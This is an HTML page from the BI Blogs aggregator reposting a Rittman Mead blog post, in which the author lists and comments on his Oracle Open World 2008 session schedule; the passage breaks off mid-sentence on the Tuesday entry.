@@ -1,0 +1,471 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><!-- Replace with your own languge code - more info here (http://www.w3.org/TR/REC-html40/struct/dirlang.html#h-8.1) -->
+
+<head profile="http://gmpg.org/xfn/11">
+	<title>BI Blogs &raquo; My Oracle Business Intelligence Open World 2008 Schedule</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="generator" content="WordPress 2.2.1" /> <!-- leave this for stats please -->
+	<style type="text/css" media="screen">
+		@import url( http://www.biblogs.com/wp-content/themes/my_aalglatt/style.css );
+	</style>
+
+	<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://www.biblogs.com/feed/" />
+	<link rel="alternate" type="text/xml" title="RSS .92" href="http://www.biblogs.com/feed/rss/" />
+	<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://www.biblogs.com/feed/atom/" />
+	<link rel="shortcut icon" type="image/ico" href="http://www.biblogs.com/wp-content/themes/my_aalglatt/favicon.ico" />
+	<link rel="pingback" href="http://www.biblogs.com/xmlrpc.php" />
+    	<link rel='archives' title='March 2009' href='http://www.biblogs.com/2009/03/' />
+	<link rel='archives' title='February 2009' href='http://www.biblogs.com/2009/02/' />
+	<link rel='archives' title='January 2009' href='http://www.biblogs.com/2009/01/' />
+	<link rel='archives' title='December 2008' href='http://www.biblogs.com/2008/12/' />
+	<link rel='archives' title='November 2008' href='http://www.biblogs.com/2008/11/' />
+	<link rel='archives' title='October 2008' href='http://www.biblogs.com/2008/10/' />
+	<link rel='archives' title='September 2008' href='http://www.biblogs.com/2008/09/' />
+	<link rel='archives' title='August 2008' href='http://www.biblogs.com/2008/08/' />
+	<link rel='archives' title='July 2008' href='http://www.biblogs.com/2008/07/' />
+	<link rel='archives' title='June 2008' href='http://www.biblogs.com/2008/06/' />
+	<link rel='archives' title='May 2008' href='http://www.biblogs.com/2008/05/' />
+	<link rel='archives' title='April 2008' href='http://www.biblogs.com/2008/04/' />
+	<link rel='archives' title='March 2008' href='http://www.biblogs.com/2008/03/' />
+	<link rel='archives' title='February 2008' href='http://www.biblogs.com/2008/02/' />
+	<link rel='archives' title='January 2008' href='http://www.biblogs.com/2008/01/' />
+	<link rel='archives' title='December 2007' href='http://www.biblogs.com/2007/12/' />
+	<link rel='archives' title='November 2007' href='http://www.biblogs.com/2007/11/' />
+	<link rel='archives' title='October 2007' href='http://www.biblogs.com/2007/10/' />
+	<link rel='archives' title='September 2007' href='http://www.biblogs.com/2007/09/' />
+	<link rel='archives' title='August 2007' href='http://www.biblogs.com/2007/08/' />
+	<link rel='archives' title='July 2007' href='http://www.biblogs.com/2007/07/' />
+	<link rel='archives' title='June 2007' href='http://www.biblogs.com/2007/06/' />
+	<link rel='archives' title='May 2007' href='http://www.biblogs.com/2007/05/' />
+	<link rel='archives' title='April 2007' href='http://www.biblogs.com/2007/04/' />
+	<link rel='archives' title='March 2007' href='http://www.biblogs.com/2007/03/' />
+	<link rel='archives' title='February 2007' href='http://www.biblogs.com/2007/02/' />
+	<link rel='archives' title='January 2007' href='http://www.biblogs.com/2007/01/' />
+	<link rel='archives' title='December 2006' href='http://www.biblogs.com/2006/12/' />
+	<link rel='archives' title='November 2006' href='http://www.biblogs.com/2006/11/' />
+	<link rel='archives' title='October 2006' href='http://www.biblogs.com/2006/10/' />
+	<link rel='archives' title='September 2006' href='http://www.biblogs.com/2006/09/' />
+	<link rel='archives' title='August 2006' href='http://www.biblogs.com/2006/08/' />
+	<link rel='archives' title='July 2006' href='http://www.biblogs.com/2006/07/' />
+	<link rel='archives' title='June 2006' href='http://www.biblogs.com/2006/06/' />
+	<link rel='archives' title='May 2006' href='http://www.biblogs.com/2006/05/' />
+	<link rel='archives' title='April 2006' href='http://www.biblogs.com/2006/04/' />
+	<link rel='archives' title='March 2006' href='http://www.biblogs.com/2006/03/' />
+	<link rel='archives' title='February 2006' href='http://www.biblogs.com/2006/02/' />
+	<link rel='archives' title='January 2006' href='http://www.biblogs.com/2006/01/' />
+	<link rel='archives' title='December 2005' href='http://www.biblogs.com/2005/12/' />
+	<link rel='archives' title='November 2005' href='http://www.biblogs.com/2005/11/' />
+	<link rel='archives' title='October 2005' href='http://www.biblogs.com/2005/10/' />
+	<link rel='archives' title='September 2005' href='http://www.biblogs.com/2005/09/' />
+	<link rel='archives' title='August 2005' href='http://www.biblogs.com/2005/08/' />
+	<link rel='archives' title='July 2005' href='http://www.biblogs.com/2005/07/' />
+	<link rel='archives' title='June 2005' href='http://www.biblogs.com/2005/06/' />
+	<link rel='archives' title='May 2005' href='http://www.biblogs.com/2005/05/' />
+	<link rel='archives' title='April 2005' href='http://www.biblogs.com/2005/04/' />
+	<link rel='archives' title='March 2005' href='http://www.biblogs.com/2005/03/' />
+	<link rel='archives' title='February 2005' href='http://www.biblogs.com/2005/02/' />
+			<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.biblogs.com/xmlrpc.php?rsd" />
+
+<style type="text/css" media="screen">
+
+
+
+/* Begin Contact Form CSS */
+
+.contactform {
+
+	position: static;
+
+	overflow: hidden;
+
+}
+
+
+
+.contactleft {
+
+	width: 25%;
+
+	text-align: right;
+
+	clear: both;
+
+	float: left;
+
+	display: inline;
+
+	padding: 4px;
+
+	margin: 5px 0;
+
+}
+
+
+
+.contactright {
+
+	width: 70%;
+
+	text-align: left;
+
+	float: right;
+
+	display: inline;
+
+	padding: 4px;
+
+	margin: 5px 0;
+
+}
+
+
+
+.contacterror {
+
+	border: 1px solid #ff0000;
+
+}
+
+
+
+.contactsubmit {
+
+}
+
+/* End Contact Form CSS */
+
+
+
+	</style>
+
+
+
+</head>
+
+<body>
+<div id="container">
+<div id="skip">
+	<p><a href="#content" title="Skip to site content">Skip to content</a></p>
+	<p><a href="#search" title="Skip to search" accesskey="s">Skip to search - Accesskey = s</a></p>
+</div>
+<hr />
+<!-- change /wp-content/themes/aalglatt/images/logo.gif if necessary -->
+	<h1><a href="http://www.biblogs.com">BI Blogs</a></h1>
+	<div class="tagline">Bringing together Business Intelligence voices from across the web</div> 
+	<div id="content_bg">
+	<!-- Needed for dropshadows -->
+	<div class="container_left">
+	<div class="container_right">
+	<div class="topline">
+	<!-- Start float clearing -->
+	<div class="clearfix">
+<!-- end header --><!-- begin sidebar -->
+<div id="right">
+     <div id="sponsor" style="text-align: center; padding-top: 5px;"> 
+        <script type="text/javascript">
+        google_ad_client = "pub-7094768637598166";
+        google_ad_width = 200;
+        google_ad_height = 200;
+        google_ad_format = "200x200_as";
+        google_ad_type = "text";
+        google_ad_channel = "";
+        google_color_border = "7DA721";
+        google_color_bg = "F7FEDC";                                             
+        google_color_link = "7DA721";
+        google_color_text = "000000";
+        google_color_url = "7DA721";
+        google_ui_features = "rc:6";
+        </script>
+        <script type="text/javascript"
+          src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+        </script>
+
+     </div>                                                                  
+		<div class="line"></div>
+
+		<div id="links">
+		<div id="pages">
+			<h3>Pages</h3>
+				<ul>
+			  <li style="font-size: +1.2em;">
+			    <a href="/category/hot-posts/?PHPSESSID=e12b7b7500d0d309b1925a6e2a0be942" title="Hot Posts"><str>Hot Posts</str></a>
+			  </li>
+					<li class="page_item"><a href="http://www.biblogs.com/about/" title="About BI Blogs">About BI Blogs</a></li>
+<li class="page_item"><a href="http://www.biblogs.com/contact-us/" title="Contact Us">Contact Us</a></li>
+				</ul>
+		</div>
+			
+		<div class="line"></div>
+		
+		<h3>Search</h3>
+			<p class="searchinfo">search site archives</p>
+			<div id="search">
+				<div id="search_area">
+					<form id="searchform" method="get" action="/index.php"><input type="hidden" name="PHPSESSID" value="e12b7b7500d0d309b1925a6e2a0be942" />
+						<input class="searchfield" type="text" name="s" id="s" value="" title="Enter keyword to search" />
+						<input class="submit" type="submit" name="submit" value="" title="Click to search archives" />
+					</form>
+				</div>
+			</div>
+			
+			
+			
+		<div class="line"></div>
+		
+		<h3>Currently Aggregating</h3>
+			<ul>
+				<li><a href="http://bardoli.blogspot.com" title="This blog contains the musings of Nenshad D. Bardoliwalla, technologist, musician, and psychologist.">Bardoli Blog</a></li>
+<li><a href="http://www.bayontechnologies.com/bt/blog/">bayon blog</a></li>
+<li><a href="http://www.be-ice.eu/" title="Business Intelligence Cool as Ice">Be Ice: Oracle BI Consultancy</a></li>
+<li><a href="http://blogs.msdn.com/bi_systems/" title="Welcome to the BI Best Practices Blog.">Best Practices for Microsoft Business Intelligence</a></li>
+<li><a href="http://bibrain.blogspot.com/">BI Brain</a></li>
+<li><a href="http://www.bidigest.com" title="Lecturas sobre el Business Intelligence y análisis de la información">BI Digest - Business Intelligence</a></li>
+<li><a href="http://www.esj.com" title="Breaking news and features focused on the latest business intelligence tools, technology, and trends. For IT leaders and business executives who plan, build, deploy, and use BI products.">BI this week</a></li>
+<li><a href="http://www.b-eye-network.com/blogs/imhoff/" title="Welcome to my Web log (blog).    This is another means for me to communicate, educate and participate within the Business Intelligence industry. It is a perfect forum for airing opinions, thoughts, vendor and client updates, problems and questions. To max">Blog: Claudia Imhoff</a></li>
+<li><a href="http://www.b-eye-network.com/blogs/linstedt/" title="Bill Inmon has given me this wonderful opportunity to bring readers interesting thoughts  into Data Warehousing, Business Intelligence, ETL/ELT (integration in general), Service Oriented Architecture and other items related to business intelligence.  Nano">Blog: Dan E. Linstedt</a></li>
+<li><a href="http://www.b-eye-network.co.uk/blogs/ferguson/" title="Welcome to my blog on the UK Business Intelligence Network. I hope to help you stay in touch with hot topics and reality on the ground in the UK and European business intelligence markets and to provide content, opinion and expertise on business intellige">Blog: Mike Ferguson</a></li>
+<li><a href="http://www.b-eye-network.com/blogs/hackathorn/" title="Welcome to my blog that focuses on business intelligence in the global context. We live in a increasingly small world. Our economy is globalized to a large degree in every industry, whether we like it or not! Please join me by commenting on these entries">Blog: Richard Hackathorn</a></li>
+<li><a href="http://blog.sasinct.com/" title="Sharing with the world everything we know about SAS.">Blogging about all things SAS</a></li>
+<li><a href="http://blogs.proclarity.com/blogs/" title="Knowledge Management and Collaboration Platform">blogs.proclarity.com</a></li>
+<li><a href="http://bloxchronicles.blogspot.com/" title="News, views, tips and tricks on Business Intelligence, Analytics, Reporting and Data Warehousing and Software Development.">BLOX Chronicles</a></li>
+<li><a href="http://chennaibi.blogspot.com/">Business Intelligence and Datawarehousing</a></li>
+<li><a href="http://businessintelligence-ar.blogspot.com/">Business Intelligence Argentina</a></li>
+<li><a href="http://blogs.hexaware.com/business_intelligence/" title="A practical guide that provides insights into specific technical challenges faced in executing Business Intelligence projects and an abstract view on the perception, trends and advancements in the Business Intelligence and Data Warehousing space.">Business Intelligence – A Practitioner’s View</a></li>
+<li><a href="http://www.biguru-online.com/" title="PLEASE REACT - BE AN ONLINE GURE YOURSELF">Business Intelligence Guru Online</a></li>
+<li><a href="http://arubawayne.blogspot.com/">Business Intelligence in Real Life</a></li>
+<li><a href="http://blogs.ittoolbox.com/bi/tools/" title="Follow one Business Intelligence Specialist, rich in experience with BI tools, as he examines the inner workings, analyzes relevancy and practicality, and provides hands-on learning&#039;s and insight on new and emerging technologies that are impacting the Bus">Business Intelligence Tools: Lessons in New &#038; Emerging Technologies</a></li>
+<li><a href="http://www.calumo.com/blog/">Calumo - Business Intelligence and Performance Management Blog</a></li>
+<li><a href="http://spaces.msn.com/members/cwebbbi/" title="MDXtreme Programming!">Chris Webb&#039;s BI Blog</a></li>
+<li><a href="http://clickstream.blogspot.com" title="Data warehousing, business intelligence, IT strategy and architecture, and occasional interesting bits.">Clickstream</a></li>
+<li><a href="http://cyrilonbi.wordpress.com" title="The Art and Science of Requirements Definition for BI Reporting Systems">Cyril on Business Intelligence</a></li>
+<li><a href="http://denglishbi.spaces.live.com/" title="Welcome to my random thoughts">Dan English&#039;s BI Blog</a></li>
+<li><a href="http://geekswithblogs.net/darrengosbell/Default.aspx" title="Business Intelligence, SQL Server, .Net, Powershell and MDX Madness">Darren Gosbell [MVP] - Random Procrastination</a></li>
+<li><a href="http://datadoghouse.typepad.com/data_doghouse/" title="Unleashed observations on performance management, business intelligence, and data warehousing.">Data Doghouse - performance management, business intelligence, and data warehousing</a></li>
+<li><a href="http://www.dwreview.com" title="Data Warehouses are increasingly used by enterprises to increase efficiency and competitiveness. Using Scorecarding, Data Mining and OLAP analysis, business value can be extracted from Data Warehouses.  Generating positive return-on-investments (ROI) from">Data Warehousing Explained</a></li>
+<li><a href="http://www.datamgmt.com/" title="The Data Management &#038; Warehousing Knowledge Base provides information and techniques about the design, build and implementation of data warehousing solutions that we as a company use and hope that you will also find useful.">Data Warehousing Knowledge Base</a></li>
+<li><a href="http://datadoodle.com">datadoodle</a></li>
+<li><a href="http://wisdom.smetser5.nl/" title="A weblog about how data might become wisdom">Dutch Business Intelligence Blog</a></li>
+<li><a href="http://dylanwan.wordpress.com/" title="My notes about Business Intelligence, Data Warehousing, OLAP, and Master Data Management">Dylan&#039;s BI Study Notes</a></li>
+<li><a href="http://blogs.microsoft.co.il/blogs/barbaro/">Ella Maschiach&#039;s BI Blog</a></li>
+<li><a href="http://estudiandobi.blogspot.com/">Estudiando BI</a></li>
+<li><a href="http://blogs.oracle.com/frankbuytendijk/">Frank Buytendijk Blog</a></li>
+<li><a href="http://blog.fahrnberger.net" title="Views on Business Intelligence, Corporate Performance Management and business related topics">Gert Fahrnberger &#039;s BI log</a></li>
+<li><a href="http://www.artisconsulting.com/Blogs/tabid/94/BlogID/3/Default.aspx" title="Greg Galloway&#039;s Blog">Greg Galloway</a></li>
+<li><a href="http://blogs.informatica.com/enterprise_data_management/">Informatica Enterprise Data Management</a></li>
+<li><a href="http://informationmanagement.wordpress.com/" title="Reflexiones sobre las tecnologías de la información">Information Management</a></li>
+<li><a href="http://www.itpapers.com/search.aspx?scid=1003&#038;part=rss&#038;tag=rss&#038;subj=&#038;promo=100112" title="Recent Business Intelligence / Data Warehousing White Papers Added to ITPapers.com">ITPapers.com - Recent Business Intelligence / Data Warehousing White Papers</a></li>
+<li><a href="http://jamesdixon.wordpress.com/" title="James Dixon&#039;s thoughts on commercial open source and open source business intelligence">James Dixon&#039;s Blog</a></li>
+<li><a href="http://jesseorosz.spaces.live.com/" title="Analysis Services 2000 and 2005">Jesse Orosz: Analysis Services Blog</a></li>
+<li><a href="http://johngunning.net/" title="A rising tide lifts all boats - John F. Kennedy">John Gunning</a></li>
+<li><a href="http://www.jweitz.com/" title="Technology, Information and Operations Strategy: Alignment, Innovation and Agility.">Jonathan Weitz Blog</a></li>
+<li><a href="http://www.lucidera.com/blog/" title="Thoughts about Business Analytics as an On-Demand Service">Keep It Simple</a></li>
+<li><a href="http://scorecardstreet.spaces.live.com/" title="&quot;In God We Trust...All Others, Bring Data,&quot; Deming">Laura Gibbons Scorecard Application &#38; Six Sigma Blog</a></li>
+<li><a href="http://blogs.ittoolbox.com/bi/consultant/" title="Follow one Business Intelligence Consultant as he shares lessons and learning&#039;s from years of experience working with various companies and outlines important measures for maximizing the return on your BI investment.">Lessons from a BI Consultant: Optimizing your BI Investment</a></li>
+<li><a href="http://looksmarter.blogspot.com/">Look Smarter Than You Are</a></li>
+<li><a href="http://adronbhall.com/blogs/technology__software_development/default.aspx" title="This blog entails my technological prowess, adventures into coding, and other productive endeavors that I partake on.">Loosely Coupled Human Code Factory</a></li>
+<li><a href="http://mgarner.wordpress.com/" title="Ideas, Musings and Thoughts">Mark Garner’s Business Intelligence Blog</a></li>
+<li><a href="http://renditionx.com/mastering/">Mastering SAP Business Information Warehouse</a></li>
+<li><a href="http://michaeltarallo.blogspot.com/">Michael Tarallo - Open Source BI Guru</a></li>
+<li><a href="http://bimatters.spaces.live.com/" title="Microsoft Analysis Services and related">Michel Caradec&#039;s BI Blog</a></li>
+<li><a href="http://asmdx.blogspot.com/">Microsoft Analysis Services and MDX</a></li>
+<li><a href="http://sqlblog.com/blogs/mosha/default.aspx">Microsoft OLAP by Mosha Pasumansky</a></li>
+<li><a href="http://www.miky-schreiber.com/Blog/CategoryView,category,BI.aspx" title="Programmer&#039;s insights, Jewish&#039;s beliefs, Politic thoughts and more...">Miky Schreiber&#039;s Blog - BI</a></li>
+<li><a href="http://sqljunkies.com/WebLog/mosha/" title="Microsoft OLAP - Analysis Services">Mosha Pasumansky</a></li>
+<li><a href="http://javierdequiros.blogspot.com" title="El blog de javier delgado bernaldo de quir�s sobre Business Intelligence (y otras cosas) �en espa�ol!">Mr. BI</a></li>
+<li><a href="http://nok20.com/" title="life, growth, finance, productivity, social, technology, engineering, architect, developer, bidw">Nature Of Knowledge  20%</a></li>
+<li><a href="http://numoraclerecipes.blogspot.com/">Numoracle Recipes</a></li>
+<li><a href="http://duncanlamb.blogspot.com" title="Stuff that interests me that I have some trouble finding info on... initally all about Instant Messaging (esp bots) and BI/OLAP.">OLAP/BI/IM stuff</a></li>
+<li><a href="http://oreports.com/blog/" title="OpenReports, Open Source, Business Intelligence">Open Intelligence</a></li>
+<li><a href="http://oraclebi.blogspot.com" title="Blog for all things Oracle Business Intelligence. Includes musings and postings on Oracle Discoverer, OLAP, and other Oracle BI products, technologies and tools.">Oracle Business Intelligence Blog</a></li>
+<li><a href="http://oracledmt.blogspot.com" title="Blog on Data Mining and Analytics, with a special focus on Oracle. Analytics paves the way to transform databases into Knowledgebases.">Oracle Data Mining and Analytics</a></li>
+<li><a href="http://blogs.oracle.com/warehousebuilder/" title="News, resources and comment about Oracle&#039;s ETL, Data Quality and Data Integration solution">Oracle Warehouse Builder (OWB) Weblog</a></li>
+<li><a href="http://oramossoracle.blogspot.com" title="Information Warrior">oramoss oracle</a></li>
+<li><a href="http://pjsrandom.wordpress.com/" title="The rantings of a middle-aged computer consultant and generally nice person">Pete-s random notes</a></li>
+<li><a href="http://blog.vyvojar.cz/radim/default.aspx" title="Radim Hampel : Microsoft business intelligence, performance management and data warehousing">Radim.NET</a></li>
+<li><a href="http://www.rdabiblog.com/">RDA Corp - Business Intelligence and SQL Server</a></li>
+<li><a href="http://www.rittmanmead.com/blog/" title="Delivered Intelligence">Rittman Mead Consulting</a></li>
+<li><a href="http://sistemasdecisionales.blogspot.com/">Sistemas Decisionales, algo mas que Business Intelligence</a></li>
+<li><a href="http://sqljunkies.com/WebLog/sqlbi/" title="Business Intelligence with SQL Server (by Marco Russo)">SQL BI</a></li>
+<li><a href="http://talkdig.blogspot.com/">Talk DIG</a></li>
+<li><a href="http://dwhblog.org/blog/" title="A Real World Experience">The Data Warehouse Blog</a></li>
+<li><a href="http://etlguy.com/" title="Data Integration, One Bit At A Time">the ETL Guy</a></li>
+<li><a href="http://blogs.sas.com/sascom/">The sascom magazine blog</a></li>
+<li><a href="http://www.taodata.blogspot.com/">The TAO of Data</a></li>
+<li><a href="http://blog.todmeansfox.com/" title="Business Intelligence, Data Warehousing, SQL, Visual FoxPro.">Tod means Fox</a></li>
+<li><a href="http://todobi.blogspot.com/" title="Business Intelligence, Data Warehouse, CRM y mucho mas...">Todo BI</a></li>
+<li><a href="http://technology.amis.nl/blog" title="Weblog for the Amis technology corner">Weblog for the Amis technology corner</a></li>
+<li><a href="http://www.asterdata.com/blog/">Winning on Data: Aster Data Systems Blog</a></li>
+			</ul>
+				
+		<div class="line"></div>
+		
+		<h3>Archives</h3>
+			<ul>
+		 			<li><a href='http://www.biblogs.com/2009/03/' title='March 2009'>March 2009</a></li>
+	<li><a href='http://www.biblogs.com/2009/02/' title='February 2009'>February 2009</a></li>
+	<li><a href='http://www.biblogs.com/2009/01/' title='January 2009'>January 2009</a></li>
+	<li><a href='http://www.biblogs.com/2008/12/' title='December 2008'>December 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/11/' title='November 2008'>November 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/10/' title='October 2008'>October 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/09/' title='September 2008'>September 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/08/' title='August 2008'>August 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/07/' title='July 2008'>July 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/06/' title='June 2008'>June 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/05/' title='May 2008'>May 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/04/' title='April 2008'>April 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/03/' title='March 2008'>March 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/02/' title='February 2008'>February 2008</a></li>
+	<li><a href='http://www.biblogs.com/2008/01/' title='January 2008'>January 2008</a></li>
+	<li><a href='http://www.biblogs.com/2007/12/' title='December 2007'>December 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/11/' title='November 2007'>November 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/10/' title='October 2007'>October 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/09/' title='September 2007'>September 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/08/' title='August 2007'>August 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/07/' title='July 2007'>July 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/06/' title='June 2007'>June 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/05/' title='May 2007'>May 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/04/' title='April 2007'>April 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/03/' title='March 2007'>March 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/02/' title='February 2007'>February 2007</a></li>
+	<li><a href='http://www.biblogs.com/2007/01/' title='January 2007'>January 2007</a></li>
+	<li><a href='http://www.biblogs.com/2006/12/' title='December 2006'>December 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/11/' title='November 2006'>November 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/10/' title='October 2006'>October 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/09/' title='September 2006'>September 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/08/' title='August 2006'>August 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/07/' title='July 2006'>July 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/06/' title='June 2006'>June 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/05/' title='May 2006'>May 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/04/' title='April 2006'>April 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/03/' title='March 2006'>March 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/02/' title='February 2006'>February 2006</a></li>
+	<li><a href='http://www.biblogs.com/2006/01/' title='January 2006'>January 2006</a></li>
+	<li><a href='http://www.biblogs.com/2005/12/' title='December 2005'>December 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/11/' title='November 2005'>November 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/10/' title='October 2005'>October 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/09/' title='September 2005'>September 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/08/' title='August 2005'>August 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/07/' title='July 2005'>July 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/06/' title='June 2005'>June 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/05/' title='May 2005'>May 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/04/' title='April 2005'>April 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/03/' title='March 2005'>March 2005</a></li>
+	<li><a href='http://www.biblogs.com/2005/02/' title='February 2005'>February 2005</a></li>
+ 			</ul>
+ 					
+		<div class="line"></div>
+
+					</div>
+</div>
+
+<!-- end sidebar -->
+<hr />
+<div id="content">
+
+		<h2 id="post-8494"><a href="http://www.biblogs.com/2008/08/18/my-oracle-business-intelligence-open-world-2008-schedule/" rel="bookmark">My Oracle Business Intelligence Open World 2008 Schedule</a></h2>	
+	<div class="meta">Posted on the August 18th, 2008. <span class="reads">Read 391 times</span> </div>
+	<p class="post-source">
+        Source:
+        <a href="http://www.rittmanmead.com">
+                 Rittman Mead Consulting        </a>
+        [<a href="http://www.rittmanmead.com/2008/08/18/my-oracle-business-intelligence-open-world-2008-schedule/">link</a>]
+	</p>
+
+	<div class="main">
+		<p><a href="http://oracledoug.com/serendipity/index.php?/archives/1430-My-Openworld-Schedule.html">Doug Burns&#8217; posting of his Open World schedule</a> made me think about mine yesterday evening, and so I fired up the Schedule Builder application (which now uses Oracle Data Mining to predict which other sessions you might be interested in, presumably based on what others who picked this session have also chosen) and got to work building my schedule. Here it is:</p>
+<p><strong>Sunday September 21st<br />
+</strong><br />
+08:30 - 10:00 : Extending and Customizing the Oracle BI Applications Data Warehouse<br />
+10:00 - 12:00 : Oracle BI - Oracle Business Intelligence SIG<br />
+13:00 - 15.15 : OAUG Business Intelligence / Data Warehouse SIG<br />
+16.30 - 17.30 : ODTUG Essbase Symposium, Part 3 : Oracle Business Intelligence Enterprise Edition<br />
+19:00 - ???     : Blogger meetup, Thirsty Bear Bar and Restaurant</p>
+<p>I fly in to San Francisco around 2pm on the Saturday afternoon, based on previous years I&#8217;ll probably last until around 7pm and then crash out. Sunday, the next day, is a pretty early start for me (why do US conferences start so early - over at the UKOUG conference most people haven&#8217;t gone to bed by that point) and I&#8217;m doing the first of my five sessions, on extending the Oracle BI Applications data warehouse using the Informatica tool. This is an hour and a half presentation at 8.30 in the morning so I&#8217;m not sure who&#8217;ll turn up, I&#8217;ll probably be surprised though as registration starts at 7am and there are usually more than a few people around at that point. The rest of the day is taken up by user group sessions, I&#8217;ll be keen to go along to them, and a session that Borkur and I are doing during the Essbase Symposium, we&#8217;ll be going through the integration between OBIEE and Essbase including what&#8217;s new with the Essbase 11.1 release. I think the blogger meetup is later on that evening around 7pm so it&#8217;ll certainly be a long day.</p>
+<p><strong>Monday September 22nd<br />
+</strong><br />
+09:00 - 11:00 : Oracle Keynote, Charles Phillips and Chuck Rozwat<br />
+11:30 - 12:30 : Using Cube-Organized Materialized Views (Bud Endress)<br />
+13:00 - 14:00 : Oracle Business Intelligence Roadmap &#38; Strategy (Paul Rodwick)<br />
+14:30 - 15:30 : Automating Business Decisions using Oracle Real-Time Decisions<br />
+17:30 - 18:30 : Oracle Essbase Products, What&#8217;s New and What&#8217;s Coming (Dave Collins, Aneel Shenker)<br />
+19:00 - ???    : Oracle ACE Dinner (I think)</p>
+<p>Monday starts off with the Keynote from Charles Phillips and Chuck Rozwat; I wouldn&#8217;t normally rush to a Charles Phillips keynote (particularly if its the morning after the blogger meetup) but based on what I&#8217;ve heard on the grapevine, and considering that Chuck Rozwat is presenting as well, I wouldn&#8217;t be surprised if (a) they formally announce the first release, proper, of the Fusion applications, and (b) announce the key features for Oracle Database 11gR2. What I might do is pitch up at the OTN lounge and watch it from there, it depends on whether I&#8217;ve got myself into the queue in time. After that is one of the presentations I most look forward to, Bud Endress&#8217; annual talk on what&#8217;s new in Oracle OLAP; this year it&#8217;s the cube organized materialized view feature where you can register OLAP analytic workspaces and use them instead of a number of separate materialized views.</p>
+<p>Following Bud&#8217;s talk is the Oracle Business Intelligence Roadmap and Strategy talk, it&#8217;ll be interesting to hear any more on release dates (by my reckoning OBIEE 11gR2 is at least six months to a year late now, at last year&#8217;s Open World they were showing off key features of this new release and we seem no nearer to a production release, or even a beta, yet) and any more news on some of the new features coming with the 11g release, including the balanced scorecard application, the new version of Answers and the Action Framework. After this it&#8217;s my session on Oracle Real-Time Decisions, and with this presentation, something I&#8217;m working on for this iteration of the talk is to show integration between RTD and a calling application, probably Oracle Application Express if I can work through the documentation for the RTD SOAP interface. After that it&#8217;s an update on Essbase and then off, I think, to the ACE&#8217;s dinner later in the evening.</p>
+<p><strong>Tuesday September 23rd</strong></p>
+<p>09:00 - 10:00 : Data Modeling Techniques using Oracle BI Server<br />
+12:00 - 13:00 : OTN Office Hours Duty<br />
+13:00 - 14:00 : New Technologies in Oracle BI Suite Enterprise Edition<br />
+14:30 - 16:30 : Thomas Kurian Fusion Middleware Keynote<br />
+17:00 - 18:00 : Oracle&#8217;s Strategic OLAP Technologies (Oracle OLAP for the Database, Oracle Essbase for Middleware)</p>
+<p>Whilst running my BI masterclasses in EMEA this year and last some of the most positive feedback I got was around the data modeling section, where I show how features such as logical table sources, physical and logical joins, fragmentation and time dimensions work. I&#8217;ll be delivering the highlights of this section first thing in the morning, together with some new material on resolving circular joins and the handling of SCD2 dimensions in both OBIEE and the BI Applications. Following on from this session is the first of my <a href="http://wiki.oracle.com/page/Oracle+ACE+Office+Hours+in+the+OTN+Lounge">sessions in the OTN lounge</a>, I&#8217;ll be joined this morning by Debra Lilly (UKOUG Director and Oracle Fusion specialist) and staying until around 1pm.</p>
+<p>The session after lunch is probably one of the three key Open World sessions for me (the first is the BI Roadmap one, and other is the one on OBIEE performance optimization on Wednesday). The abstract for this sessions suggests that it&#8217;ll cover the integration between Hyperion and OBIEE, SmartSpace and OBIEE and what&#8217;s coming in Answers Plus, and given that much of my consulting job is knowing the roadmap for these products, this&#8217;ll be a &#8220;don&#8217;t miss&#8221; session for me. After that it&#8217;s Thomas Kurian&#8217;s Fusion Middleware Keynote (expect lots on BEA and how Fusion Middleware/IdM/BI is going to power the Fusion Applications that Charles Phillips launches on Monday). Following that is a joint talk by John Kopcke and Ray Roccoforte on Essbase and Oracle OLAP positioning, I guess I know the score on this one now but it&#8217;ll be interesting to see how they handle the inevitable questions and whether any new features of Oracle OLAP are mentioned (I&#8217;ve heard one rumour, but it&#8217;s so interesting (he says, somewhat mysteriously) that I&#8217;ll just have to keep it to myself unless they 